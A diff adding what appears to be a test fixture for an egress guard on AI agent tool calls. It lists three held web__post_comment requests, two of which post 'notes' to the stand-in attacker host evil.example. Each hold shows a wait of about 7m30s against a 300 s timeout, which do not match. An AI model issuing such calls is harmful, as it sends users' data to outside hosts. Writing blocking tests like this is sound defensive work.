@@ -1,0 +1,33 @@
+holds: 3 open
+
+hold 1100000000000011 web__post_comment egress
+held by tainted: session tainted by web__fetch at 2026-10-02T15:00:00.004Z (seq 3); egress is held for the rest of the session, even to a host in this tool's domains
+waiting about 7m30s; times out after 300 s
+session b1b1b1b1b1b1b1b1 started 2026-10-02T15:00:00.001Z, running
+session tainted by web__fetch at 2026-10-02T15:00:00.004Z (seq 3)
+args_commit c65f13964f8acb3893ab9955626db9ccecdb49b87cc28b232e901a0f4f1ab447, 87 bytes of arguments
+{
+  "url": "https://api.example.com/repos/me/notes/issues/7/comments",
+  "body": "Looks good."
+}
+
+hold 2200000000000022 web__post_comment egress
+held by egress: session tainted by web__fetch at 2026-10-02T15:00:00.004Z (seq 3); argument "url": host evil.example is not in this tool's domains
+waiting about 7m30s; times out after 300 s
+session b2b2b2b2b2b2b2b2 started 2026-10-02T15:00:00.007Z, running
+session tainted by web__fetch at 2026-10-02T15:00:00.004Z (seq 3)
+args_commit 648ddd57164fef2cb28cb6c5dc62e587ad25ff4cfe7afff701607fcf93760d0c, 47 bytes of arguments
+{
+  "url": "https://evil.example/x",
+  "body": "notes"
+}
+
+hold 3300000000000033 web__post_comment egress
+held by egress: argument "url": host evil.example is not in this tool's domains
+waiting about 7m30s; times out after 300 s
+session c3c3c3c3c3c3c3c3 started 2026-10-02T15:00:00.010Z, running
+args_commit 771a42212aff905dbc4bdbb03c7e539f0338c90c9ffde86014c0692ad89a99f5, 47 bytes of arguments
+{
+  "url": "https://evil.example/x",
+  "body": "notes"
+}
